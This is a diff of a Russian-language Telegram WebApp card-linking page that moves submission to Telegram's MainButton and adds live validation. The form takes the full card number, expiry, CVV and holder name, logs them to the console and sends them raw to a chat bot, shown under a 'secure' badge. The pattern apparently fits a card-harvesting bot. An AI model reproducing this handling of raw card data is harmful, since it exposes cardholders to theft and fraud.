@@ -110,28 +110,6 @@
             font-size: 20px;
         }
         
-        .submit-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        
-        .submit-btn:active {
-            transform: scale(0.98);
-        }
-        
-        .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
         .secure-badge {
             text-align: center;
             margin-top: 20px;
@@ -143,29 +121,9 @@
             gap: 5px;
         }
         
-        .loading {
+        /* Скрываем обычную кнопку отправки, используем MainButton Telegram */
+        .submit-btn {
             display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        
-        .loading.active {
-            display: block;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -228,15 +186,11 @@
                 >
             </div>
             
+            <!-- Обычная кнопка скрыта, используем MainButton -->
             <button type="submit" class="submit-btn" id="submitBtn">
                 Привязать карту
             </button>
         </form>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Обработка данных...</p>
-        </div>
         
         <div class="secure-badge">
             <span>🔐</span>
@@ -266,12 +220,37 @@
         tg.setHeaderColor('#667eea');
         tg.setBackgroundColor('#ffffff');
         
-        // Включаем кнопку "Назад"
-        if (tg.BackButton) {
-            tg.BackButton.show();
-            tg.onEvent('backButtonClicked', function() {
-                tg.close();
-            });
+        // Настраиваем MainButton (основную кнопку внизу)
+        tg.MainButton.setText('Привязать карту');
+        tg.MainButton.setParams({
+            color: '#667eea',
+            textColor: '#ffffff',
+            is_active: false,
+            is_visible: false
+        });
+        
+        // Функция проверки валидности формы
+        function checkFormValidity() {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+            
+            const isValid = cardNumber.length >= 16 && 
+                           /^\d{2}\/\d{2}$/.test(cardExpiry) && 
+                           cardCvv.length >= 3 && 
+                           cardHolder.length >= 3;
+            
+            if (isValid) {
+                tg.MainButton.setParams({
+                    is_active: true,
+                    is_visible: true
+                });
+            } else {
+                tg.MainButton.setParams({
+                    is_visible: false
+                });
+            }
         }
         
         // Форматирование номера карты
@@ -286,6 +265,7 @@
                 formattedValue += value[i];
             }
             e.target.value = formattedValue;
+            checkFormValidity();
         });
         
         // Форматирование срока действия
@@ -296,47 +276,31 @@
                 value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
             e.target.value = value;
+            checkFormValidity();
         });
         
         // Только цифры для CVV
         const cardCvvInput = document.getElementById('cardCvv');
         cardCvvInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
+            checkFormValidity();
         });
         
-        // Обработка отправки формы
-        document.getElementById('cardForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Проверка владельца карты
+        const cardHolderInput = document.getElementById('cardHolder');
+        cardHolderInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+            checkFormValidity();
+        });
+        
+        // Обработка нажатия на MainButton
+        tg.onEvent('mainButtonClicked', function() {
+            console.log('MainButton clicked');
             
             const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const cardExpiry = document.getElementById('cardExpiry').value;
             const cardCvv = document.getElementById('cardCvv').value;
-            const cardHolder = document.getElementById('cardHolder').value.toUpperCase();
-            
-            // Валидация
-            if (cardNumber.length < 16) {
-                tg.showAlert('Введите корректный номер карты');
-                return;
-            }
-            
-            if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
-                tg.showAlert('Введите корректный срок действия (MM/YY)');
-                return;
-            }
-            
-            if (cardCvv.length < 3) {
-                tg.showAlert('Введите корректный CVV код');
-                return;
-            }
-            
-            if (cardHolder.length < 3) {
-                tg.showAlert('Введите имя владельца карты');
-                return;
-            }
-            
-            // Показываем загрузку
-            document.getElementById('cardForm').style.display = 'none';
-            document.getElementById('loading').classList.add('active');
+            const cardHolder = document.getElementById('cardHolder').value;
             
             // Формируем данные
             const data = {
@@ -346,27 +310,40 @@
                 card_holder: cardHolder
             };
             
-            console.log('Preparing to send data:', data);
-            console.log('tg.sendData available:', typeof tg.sendData);
+            console.log('Sending data via sendData:', data);
             
-            // Отправляем данные в бот
             try {
                 const jsonData = JSON.stringify(data);
-                console.log('JSON data:', jsonData);
+                console.log('JSON data to send:', jsonData);
                 
+                // Отправляем данные в бот
                 tg.sendData(jsonData);
                 console.log('sendData called successfully');
                 
-                // Закрываем WebApp
+                // Показываем прогресс и закрываем
+                tg.MainButton.showProgress();
+                
                 setTimeout(() => {
                     console.log('Closing WebApp...');
                     tg.close();
-                }, 500);
+                }, 1000);
             } catch (err) {
                 console.error('Error sending data:', err);
                 tg.showAlert('Ошибка отправки данных: ' + err.message);
+                tg.MainButton.hideProgress();
             }
         });
+        
+        // Включаем кнопку "Назад"
+        if (tg.BackButton) {
+            tg.BackButton.show();
+            tg.onEvent('backButtonClicked', function() {
+                tg.close();
+            });
+        }
+        
+        // Проверяем валидность при загрузке
+        checkFormValidity();
     </script>
 </body>
 </html>
